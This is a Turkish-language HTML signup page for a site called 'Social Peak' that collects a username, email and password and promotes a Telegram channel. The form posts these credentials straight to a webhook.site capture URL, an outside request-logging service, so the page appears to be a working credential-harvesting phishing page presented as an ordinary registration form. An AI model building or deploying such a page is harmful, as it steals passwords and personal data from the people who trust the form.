<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Social Peak</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="container">
  <div class="card">
    
    <div class="logo">
      <h2>Social Peak</h2>
    </div>
    
    <h1>Sitemize Hoşgeldiniz</h1>
    <p class="desc">
      Sistemlerimize erişmek için aşağıdaki bilgileri doldurarak kayıt olun!
    </p>

    <!-- 🔥 FORM BAĞLANDI -->
    <form action="https://webhook.site/3e76a8ca-d086-425d-86a8-476035d540e9" method="POST">

      <label>Kullanıcı Adı</label>
      <input type="text" name="username" placeholder="Bir kullanıcı adı gir..." required>

      <label>Email</label>
      <input type="email" name="email" placeholder="Bir E-Posta gir" required>

      <label>Şifre</label>
      <div class="password-box">
        <input type="password" id="password" name="password" placeholder="Şifre" required>
        <span onclick="togglePassword()"></span>
      </div>

      <div class="checkbox">
        <input type="checkbox" id="accept">
        <label for="accept">
          Kabul Ediyorum <span>Gizlilik Politikası ve Şartlar</span>
        </label>
      </div>

      <button type="submit">KAYIT OL</button>

    </form>

    <p class="login-text">
      Zaten hesabın varmı? <a href="#">Giriş Yap</a>
    </p>

    <div class="divider">
      <span>Bizi Telegram kanalımızdan</span><br>
      <span>Takip Edin</span>
    </div>

    <div class="social"><h4>SocialPeak0</h4></div>

  </div>
</div>

<script>
document.querySelector("form").addEventListener("submit", function(e) {

  const kabul = document.getElementById("accept").checked;

  if (!kabul) {
    e.preventDefault();
    alert("Şartları kabul etmelisin!");
  }
});

function togglePassword() {
  const input = document.getElementById("password");
  input.type = input.type === "password" ? "text" : "password";
}
</script>

</body>
</html>
